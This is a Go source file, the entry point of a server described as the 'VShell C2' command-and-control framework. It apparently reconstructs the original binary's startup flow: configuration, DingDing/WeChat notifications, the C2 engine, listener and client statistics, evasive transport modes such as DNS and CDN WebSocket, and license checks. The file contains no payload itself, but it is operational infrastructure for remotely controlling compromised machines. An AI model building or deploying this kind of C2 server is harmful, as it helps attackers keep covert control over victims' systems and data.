// Package main 是 VShell C2 服务器的入口：加载配置、初始化日志/通知/C2 引擎/数据库，
// 启动 Web 面板与各后台服务，并支持可选 HTTPS 与 pprof 调试端点。
// Package main is the entry point of the VShell C2 server: loads configuration,
// initializes logging/notifications/C2 engine/database, starts the web panel
// and background services, with optional HTTPS and pprof debug endpoints.
package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"net/http/pprof"
	"os"
	"os/signal"
	"syscall"

	"vshell/c2engine"
	"vshell/models"
	"vshell/router"
	"vshell/utils"
)

// main 按步骤初始化并启动整个 C2 服务端。
// main initializes and starts the whole C2 server in sequential steps.
func main() {
	// ========================================================================
	// Step 1: Load configuration from conf/setting.conf
	// 第一步：从 conf/setting.conf 加载配置
	// ========================================================================
	// This replaces the hardcoded c2engine.DefaultConfig() with values from
	// the config file, matching the original binary's initialization flow.
	// 用配置文件中的值替换硬编码的 c2engine.DefaultConfig()，与原版二进制的初始化流程一致。
	cfg := utils.GetFullSettings()
	logCloser, err := utils.ConfigureLogger(cfg)
	if err != nil {
		log.Fatalf("configure logger: %v", err)
	}
	defer logCloser.Close()
	log.Printf("[Config] Loaded from conf/setting.conf (master_type=%s, port=%d)",
		cfg.MasterType, cfg.WebPort)

	// If no password configured (no setting.conf present), generate a random one.
	// No hardcoded default credentials exist in the codebase.
	if cfg.WebPassword == "" {
		b := make([]byte, 8)
		if _, err := rand.Read(b); err != nil {
			log.Fatalf("generate random password: %v", err)
		}
		cfg.WebPassword = hex.EncodeToString(b)
		log.Printf("[Config] No web_password in setting.conf — generated random password: %s", cfg.WebPassword)
	}

	// Sync config into utils.Settings for auth/controller compatibility
	utils.SyncSettingsFromConfig()

	// Build c2engine config from loaded settings
	engineConfig := &c2engine.Config{
		DBPath:       "db/data.db",
		WebPort:      cfg.WebPort,
		WebIP:        cfg.WebIP,
		WebUsername:  cfg.WebUsername,
		WebPassword:  cfg.WebPassword,
		WebJWTSecret: cfg.WebJWTSecret,
		WebTitle:     cfg.WebTitle,
		License:      cfg.License,
	}

	// ========================================================================
	// Step 2: Initialize notification system (DingDing/WeChat bots)
	// 第二步：初始化通知系统（钉钉/企业微信机器人）
	// ========================================================================
	notifier := utils.GetNotifier()
	notifier.Start()

	// ========================================================================
	// Step 3: Initialize application orchestrator (iVzmssZ.RuWw1_w equivalent)
	// 第三步：初始化应用编排器（对应原版 iVzmssZ.RuWw1_w）
	// ========================================================================
	app := c2engine.GetApplication()
	if err := app.Init(engineConfig); err != nil {
		log.Printf("Warning: App init had warnings: %v", err)
	}

	// ========================================================================
	// Step 4: Initialize database
	// 第四步：初始化数据库
	// ========================================================================
	if err := models.InitDB("db/data.db"); err != nil {
		log.Printf("Warning: Database init failed: %v (running without persistence)", err)
	}

	r := router.InitRouter()

	// ========================================================================
	// Step 4.5: pprof debug endpoint (if configured in setting.conf)
	// 第四点五步：pprof 调试端点（由 setting.conf 控制）
	// ========================================================================
	if cfg.PprofIP != "" && cfg.PprofPort > 0 {
		pprofAddr := fmt.Sprintf("%s:%d", cfg.PprofIP, cfg.PprofPort)
		pprofMux := http.NewServeMux()
		pprofMux.HandleFunc("/debug/pprof/", pprof.Index)
		pprofMux.HandleFunc("/debug/pprof/cmdline", pprof.Cmdline)
		pprofMux.HandleFunc("/debug/pprof/profile", pprof.Profile)
		pprofMux.HandleFunc("/debug/pprof/symbol", pprof.Symbol)
		pprofMux.HandleFunc("/debug/pprof/trace", pprof.Trace)

		go func() {
			log.Printf("[Pprof] Debug endpoint listening on %s", pprofAddr)
			if err := http.ListenAndServe(pprofAddr, pprofMux); err != nil {
				log.Printf("[Pprof] Server error: %v", err)
			}
		}()
	}

	// ========================================================================
	// Step 5: Start web panel
	// 第五步：启动 Web 管理面板
	// ========================================================================
	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
	stats := app.GetAppInfo()

	log.Printf("========================================")
	log.Printf("  VShell Management Console v3.0")
	if cfg.WebOpenSSL {
		log.Printf("  URL: https://%s/login", addr)
	} else {
		log.Printf("  URL: http://%s/login", addr)
	}
	log.Printf("  Login: %s / ********", cfg.WebUsername)
	log.Printf("  C2 Engine: %v clients (%v online), %v listeners",
		stats["total_clients"], stats["online_clients"], stats["total_listeners"])
	log.Printf("  Modes: HTTP/HTTPS | DNS | KCP | CDN WebSocket")
	log.Printf("  Transport: TCP | UDP (KCP) | WebSocket")
	if notifier != nil {
		hasDD := cfg.DingdingAccessToken != ""
		hasWX := cfg.WxKey != ""
		if hasDD || hasWX {
			log.Printf("  Notifications: %s%s",
				boolLabel(hasDD, "DingDing"), boolLabel(hasWX, "WeChat"))
		}
	}
	if cfg.PprofPort > 0 {
		log.Printf("  Pprof: http://%s:%d/debug/pprof/", cfg.PprofIP, cfg.PprofPort)
	}

	// Report license status
	licStatus := utils.GetLicenseStatus()
	if licStatus.Valid {
		log.Printf("License OK")
		log.Printf("LicenseName: %s, LicenseTime: %s, Limit Client: %d, LicenseVIP: %v",
			licStatus.Name, licStatus.EndTime, licStatus.MaxClients, licStatus.Advanced)
	} else {
		// Original binary behavior (black-box verified):
		//   invalid license → red "License Invalid" and process exit
		//   empty license  → "Please Input Password:" (online activation prompt)
		if licStatus.Description == "no license, running in evaluation mode" {
			log.Printf("Please Input Password:")
		} else {
			log.Printf("License Invalid")
		}
		log.Fatalf("Invalid license: %s", licStatus.Description)
	}
	log.Printf("========================================")

	// ========================================================================
	// Step 6: Create HTTP server (with optional SSL)
	// 第六步：创建 HTTP 服务器（可选 SSL）
	// ========================================================================
	server := &http.Server{
		Addr:    addr,
		Handler: r,
	}

	// Handle graceful shutdown
	go func() {
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
		log.Println("Shutting down...")
		app.Stop()
		c2engine.GetListenerManager().StopAll()
		server.Close()
	}()

	// Start all background services
	app.StartBackground()

	// ========================================================================
	// Step 7: Start listening (HTTP or HTTPS based on config)
	// 第七步：开始监听（按配置选择 HTTP 或 HTTPS）
	// ========================================================================
	if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
		if err := server.ListenAndServeTLS(cfg.WebCertFile, cfg.WebKeyFile); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	} else {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	}
}

// boolLabel 在条件为真时返回带前导空格的标签，用于拼接启动日志。
// boolLabel returns the label with a leading space when cond is true (for startup logs).
func boolLabel(cond bool, label string) string {
	if cond {
		return " " + label
	}
	return ""
}
